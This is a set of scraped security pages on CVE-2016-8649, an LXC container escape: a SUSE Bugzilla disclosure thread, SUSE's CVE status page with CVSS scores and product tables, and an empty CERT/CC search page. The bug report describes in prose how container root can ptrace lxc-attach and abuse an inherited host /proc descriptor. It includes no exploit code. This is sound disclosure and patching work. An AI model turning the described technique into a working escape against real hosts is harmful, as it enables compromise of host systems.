=== Content from www.kb.cert.org_8600edac_20250126_010314.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* Current:  Search

## Search

#### Keyword

#### Vendor

#### Year

2024

2023

2022

2021

2020

2019

2018

2017

2016

2015

2014

2013

2012

2011

2010

2009

2008

2007

2006

2005

2004

2003

2002

2001

2000

more

less

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

©2025 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from bugzilla.suse.com_453cd1f3_20250126_010321.html ===


| Bugzilla – Bug 1010933 | VUL-0: CVE-2016-8649: lxc: guest escape via ptrace of lxc-attach | Last modified: 2017-11-15 15:00:06 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3DCVE-2016-8649)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 1010933**](show_bug.cgi?id=1010933)
(CVE-2016-8649)
- VUL-0: CVE-2016-8649: lxc: guest escape via ptrace of lxc-attach

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2016-8649: lxc: guest escape via ptrace of lxc-attach

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-8649 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P3 - Medium **Severity**: Normal | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Cédric Bosdonnat | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2016-11-18 12:33 UTC by Marcus Meissner | | --- | --- | | Modified: | 2017-11-15 15:00 UTC ([History](show_activity.cgi?id=1010933)) | | CC List: | 2 users (show)  bwiedemann meissner | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=1010933) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=1010933&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=1010933&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1010933#c0)  Marcus Meissner   2016-11-18 12:33:45 UTC  ``` A private security bug was reported by Roman Fiedler against LXC which requires a patch in the Linux kernel to fully address the issue. This issue is embargoed and has not been disclosed publicly. We are requesting a coordinated release date (CRD) of <2016-11-23 16:00 UTC>.  A malicious root user in an LXC container can ptrace the connecting lxc-attach process and then manipulate it. One attack is to use the inherited file descriptor, of the host's /proc, to access the rest of the host's filesystem via the openat() family of syscalls. The file descriptor is needed to write to /proc/<PID>/attr/current or /proc/<PID>/attr/exec to set the AppArmor/SELinux label of the attached process. The LXC upstream developers have developed a patch (see attachment) to protect against this attack by only passing a file descriptor of either the current or exec file itself.  A CVE, against LXC, is requested for the attack allowing the /proc fd to be used to access the host filesystem.  There's also an additional attack where a malicious root user in an unprivileged container can ptrace the connecting lxc-attach process and bypass the AppArmor/SELinux confinement completely and/or prevent lxc-attach from dropping privileges (privileges equal to the user that initial ran lxc-attach). To fix that issue, a kernel patch is needed to prevent such a ptrace operation. The LXC upstream developers report that the following patch from Eric Biederman prevents this attack:   <https://git.kernel.org/cgit/linux/kernel/git/ebiederm/user-namespace.git/commit/?h=for-next&id=2e41414828bb0b066bde2f156cfa848c38531edf>  The kernel patch is public and, as far as I know, is not associated with any CVE. The Ubuntu Kernel team reports that it fixes the disputed CVE-2015-8709, in addition to the issue described above, but I do not believe that they are the same issue.  I'm not sure if a CVE should be assigned for this kernel issue on linux-distros or if I should request one on oss-security on the CRD. At this point, I don't understand the full impact of that kernel change well enough to put together a meaningful CVE request. Suggestions/ideas are welcome.  The attached LXC patch that withholds the /proc fd from the connecting lxc-attach process mitigates the kernel issue in that it, even though the malicious root user in the container can bypass MAC confinement and/or prevent privilege dropping, there's no obvious way to access or modify the host filesystem.  Tyler ``` [Comment 2](show_bug.cgi?id=1010933#c2)  Marcus Meissner   2016-11-18 12:34:40 UTC  ``` CRD: 2016-11-23 16:00 UTC ``` [Comment 5](show_bug.cgi?id=1010933#c5)  Swamp Workflow Management   2016-11-18 23:00:43 UTC  ``` bugbot adjusting priority ``` [Comment 6](show_bug.cgi?id=1010933#c6)  Bernhard Wiedemann   2016-12-06 23:00:41 UTC  ``` This is an autogenerated message for OBS integration: This bug (1010933) was mentioned in <https://build.opensuse.org/request/show/444350> 13.2+42.1+42.2 / lxc <https://build.opensuse.org/request/show/444354> 42.1 / lxc <https://build.opensuse.org/request/show/444355> 42.2 / lxc ``` [Comment 7](show_bug.cgi?id=1010933#c7)  Bernhard Wiedemann   2016-12-07 12:43:34 UTC  ``` is public since 2016-11-23 <http://www.securityfocus.com/bid/94498> ``` [Comment 8](show_bug.cgi?id=1010933#c8)  Swamp Workflow Management   2016-12-16 18:07:41 UTC  ``` openSUSE-SU-2016:3179-1: An update that fixes one vulnerability is now available.  Category: security (important) Bug References: 1010933 CVE References: CVE-2016-8649 Sources used: openSUSE Leap 42.2 (src):    lxc-1.1.2-10.1 openSUSE Leap 42.1 (src):    lxc-1.1.2-9.1 openSUSE 13.2 (src):    lxc-1.0.6-12.1 ``` [Comment 9](show_bug.cgi?id=1010933#c9)  Swamp Workflow Management   2017-02-28 23:12:12 UTC  ``` SUSE-SU-2017:0575-1: An update that solves 11 vulnerabilities and has 95 fixes is now available.  Category: security (important) Bug References: 1000092,1000619,1003077,1005918,1006469,1006472,1007729,1008742,1009546,1009674,1009718,1009911,1010612,1010690,1010933,1011176,1011602,1011660,1011913,1012382,1012422,1012829,1012910,1013000,1013001,1013273,1013540,1013792,1013994,1014120,1014410,1015038,1015367,1015840,1016250,1016403,1016517,1016884,1016979,1017164,1017170,1017410,1018100,1018316,1018358,1018446,1018813,1018913,1019061,1019148,1019168,1019260,1019351,1019594,1019630,1019631,1019784,1019851,1020048,1020214,1020488,1020602,1020685,1020817,1020945,1020975,1021082,1021248,1021251,1021258,1021260,1021294,1021455,1021474,1022304,1022429,1022476,1022547,1022559,1022971,1023101,1023175,1023762,1023884,1023888,1024081,1024234,1024508,1024938,1025235,921494,959709,964944,969476,969477,969479,971975,974215,981709,982783,985561,987192,987576,989056,991273,998106 CVE References: CVE-2015-8709,CVE-2016-7117,CVE-2016-9806,CVE-2017-2583,CVE-2017-2584,CVE-2017-5551,CVE-2017-5576,CVE-2017-5577,CVE-2017-5897,CVE-2017-5970,CVE-2017-5986 Sources used: SUSE Linux Enterprise Workstation Extension 12-SP2 (src):    kernel-default-4.4.49-92.11.1 SUSE Linux Enterprise Software Development Kit 12-SP2 (src):    kernel-docs-4.4.49-92.11.3, kernel-obs-build-4.4.49-92.11.1 SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (src):    kernel-default-4.4.49-92.11.1, kernel-source-4.4.49-92.11.1, kernel-syms-4.4.49-92.11.1 SUSE Linux Enterprise Server 12-SP2 (src):    kernel-default-4.4.49-92.11.1, kernel-source-4.4.49-92.11.1, kernel-syms-4.4.49-92.11.1 SUSE Linux Enterprise Live Patching 12 (src):    kgraft-patch-SLE12-SP2_Update_5-1-6.1 SUSE Linux Enterprise High Availability 12-SP2 (src):    kernel-default-4.4.49-92.11.1 SUSE Linux Enterprise Desktop 12-SP2 (src):    kernel-default-4.4.49-92.11.1, kernel-source-4.4.49-92.11.1, kernel-syms-4.4.49-92.11.1 OpenStack Cloud Magnum Orchestration 7 (src):    kernel-default-4.4.49-92.11.1 ``` [Comment 10](show_bug.cgi?id=1010933#c10)  Cédric Bosdonnat   2017-03-24 08:34:46 UTC  ``` Marcus, can we close this bug? ``` [Comment 11](show_bug.cgi?id=1010933#c11)  Marcus Meissner   2017-03-30 14:45:04 UTC  ``` yeah  (usually if you submit everything you can reassign the bug to security-team) ``` [Comment 12](show_bug.cgi?id=1010933#c12)  Bernhard Wiedemann   2017-11-15 15:00:06 UTC  ``` This is an autogenerated message for OBS integration: This bug (1010933) was mentioned in <https://build.opensuse.org/request/show/542066> 15.0 / lxc ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=1010933)
* - [XML](show_bug.cgi?ctype=xml&id=1010933)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=1010933)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3DCVE-2016-8649)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from www.suse.com_845e7361_20250126_010319.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2016-8649.html)
[English](https://www.suse.com/security/cve/CVE-2016-8649.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2016-8649.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2016-8649.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2016-8649.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2016-8649.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2016-8649.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2016-8649.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2016-8649

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2016-8647.html) [[Index]](index.html) [[Next]](CVE-2016-8650.html)

### Upstream information

[CVE-2016-8649 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8649)

#### Description

lxc-attach in LXC before 1.0.9 and 2.x before 2.0.6 allows an attacker inside of an unprivileged container to use an inherited file descriptor, of the host's /proc, to access the rest of the host's filesystem via the openat() family of syscalls.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Does not affect SUSE products

This issue is currently rated as having [moderate](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database | SUSE |
| Base Score | 9 | 6 |
| Vector | AV:N/AC:L/Au:S/C:C/I:C/A:C | AV:L/AC:H/Au:S/C:C/I:C/A:C |
| Access Vector | Network | Local |
| Access Complexity | Low | High |
| Authentication | Single | Single |
| Confidentiality Impact | Complete | Complete |
| Integrity Impact | Complete | Complete |
| Availability Impact | Complete | Complete |

[CVSS v3 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 9.1 |
| Vector | CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H |
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | High |
| User Interaction | None |
| Scope | Changed |
| Confidentiality Impact | High |
| Integrity Impact | High |
| Availability Impact | High |
| CVSSv3 Version | 3 |

SUSE Bugzilla entry: [1010933](https://bugzilla.suse.com/show_bug.cgi?id=1010933) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [openSUSE-SU-2016:3179-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/3IWCUWKDUOIWW2HS3GM6IFW337N2YHXU/#3IWCUWKDUOIWW2HS3GM6IFW337N2YHXU), published Fri Dec 8 15:48:36 2023

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| openSUSE Tumbleweed | * `liblxc-devel >= 2.0.4-2.1` * `liblxc1 >= 2.0.4-2.1` * `lxc >= 2.0.4-2.1` | Patchnames: openSUSE-Tumbleweed-2024-10416 |

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products under general support and receiving all security fixes. | | |
| SUSE Linux Enterprise Micro 5.1 | kernel-default | Analysis |
| SUSE Linux Enterprise Micro 5.2 | kernel-default | Analysis |
| Products under Long Term Service Pack support and receiving important and critical security fixes. | | |
| SUSE Linux Enterprise High Performance Computing 15 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise High Performance Computing 15 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise High Performance Computing 15 SP3-ESPOS | kernel-source | Analysis |
| SUSE Linux Enterprise High Performance Computing 15 SP3-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise Module for Basesystem 15 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Module for Basesystem 15 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Module for Development Tools 15 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Module for Development Tools 15 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 11 SP4 LTSS EXTREME CORE | kernel-source | Analysis |
| SUSE Linux Enterprise Server 15 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 15 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 15 SP3-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise Server for SAP Applications 15 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 15 SP3 | kernel-source | Unsupported |
| Products past their end of life and not receiving proactive updates anymore. | | |
| HPE Helion OpenStack 8 | kernel-source | Analysis |
| SLES for SAP Applications 11 SP2 | kernel-default | Unsupported |
| SLES for SAP Applications 11 SP2 | kernel-source | Unsupported |
| SLES for SAP Applications 11 SP3 | kernel-default | Unsupported |
| SLES for SAP Applications 11 SP3 | kernel-source | Unsupported |
| SUSE CaaS Platform 4.0 | kernel-source | Analysis |
| SUSE CaaS Platform Toolchain 3 | kernel-source | Analysis |
| SUSE Enterprise Storage 6 | kernel-source | Analysis |
| SUSE Enterprise Storage 7.1 | kernel-default | Unsupported |
| SUSE Enterprise Storage 7.1 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 11 SP2 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 11 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 11 SP3 | lxc | Not affected |
| SUSE Linux Enterprise Desktop 11 SP4 | kernel-source | Analysis |
| SUSE Linux Enterprise Desktop 11 SP4 | lxc | Not affected |
| SUSE Linux Enterprise Desktop 12 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 12 SP2 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 12 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Desktop 12 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 12 SP4 | kernel-default | Unsupported |
| SUSE Linux Enterprise Desktop 12 SP4 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 15 | kernel-default | Unsupported |
| SUSE Linux Enterprise Desktop 15 | kernel-source | Unsupported |
| SUSE Linux Enterprise Desktop 15 SP1 | kernel-source | Analysis |
| SUSE Linux Enterprise Desktop 15 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Desktop 15 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise High Performance Computing 12 SP4 | kernel-default | Unsupported |
| SUSE Linux Enterprise High Performance Computing 12 SP4 | kernel-source | Unsupported |
| SUSE Linux Enterprise High Performance Computing 15 | kernel-default | Unsupported |
| SUSE Linux Enterprise High Performance Computing 15 | kernel-source | Unsupported |
| SUSE Linux Enterprise High Performance Computing 15 SP1 | kernel-source | Analysis |
| SUSE Linux Enterprise High Performance Computing 15 SP1-ESPOS | kernel-default | Unsupported |
| SUSE Linux Enterprise High Performance Computing 15 SP1-ESPOS | kernel-source | Unsupported |
| SUSE Linux Enterprise High Performance Computing 15 SP1-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise High Performance Computing 15-ESPOS | kernel-source | Analysis |
| SUSE Linux Enterprise High Performance Computing 15-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise Micro 5.0 | kernel-default | Analysis |
| SUSE Linux Enterprise Module for Basesystem 15 | kernel-default | Unsupported |
| SUSE Linux Enterprise Module for Basesystem 15 | kernel-source | Unsupported |
| SUSE Linux Enterprise Module for Basesystem 15 SP1 | kernel-source | Analysis |
| SUSE Linux Enterprise Module for Development Tools 15 | kernel-default | Unsupported |
| SUSE Linux Enterprise Module for Development Tools 15 | kernel-source | Unsupported |
| SUSE Linux Enterprise Module for Development Tools 15 SP1 | kernel-source | Analysis |
| SUSE Linux Enterprise Point of Sale 11 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Point of Sale 11 SP3 | lxc | Not affected |
| SUSE Linux Enterprise Point of Sale 12 SP2-CLIENT | kernel-source | Unsupported |
| SUSE Linux Enterprise Real Time 15 SP3 | kernel-source | Analysis |
| SUSE Linux Enterprise Server 11 SP1-LTSS | lxc | Not affected |
| SUSE Linux Enterprise Server 11 SP2 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 11 SP2 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 11 SP2-LTSS | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 11 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 11 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 11 SP3 | lxc | Not affected |
| SUSE Linux Enterprise Server 11 SP3 LTSS | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 11 SP3 LTSS | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 11 SP3-LTSS | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 11 SP3-LTSS | lxc | Not affected |
| SUSE Linux Enterprise Server 11 SP4 | kernel-source | Analysis |
| SUSE Linux Enterprise Server 11 SP4 | lxc | Not affected |
| SUSE Linux Enterprise Server 11 SP4-LTSS | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 11 SP4-LTSS | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 11 SP4-LTSS | lxc | Not affected |
| SUSE Linux Enterprise Server 12 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 12 SP2 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 12 SP2-BCL | kernel-source | Unsupported |
